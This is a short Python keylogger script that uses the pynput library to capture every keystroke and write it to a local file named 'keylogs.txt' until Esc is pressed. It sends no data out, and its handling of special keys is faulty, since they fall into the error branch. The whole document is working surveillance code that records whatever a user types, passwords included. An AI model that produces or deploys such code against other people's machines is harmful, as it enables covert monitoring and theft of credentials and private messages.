import logging
from pynput import keyboard

logging.basicConfig(filename="keylogs.txt", level=logging.INFO)

def on_press(key):
    try:
        if key == keyboard.Key.esc:
            return False
        elif key.char is not None:
            logging.info(f'{key.char}')
        else:
            logging.info(f'[{key.name.upper()}]')
    except Exception as e:
        logging.error(f'Error: {e}')

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()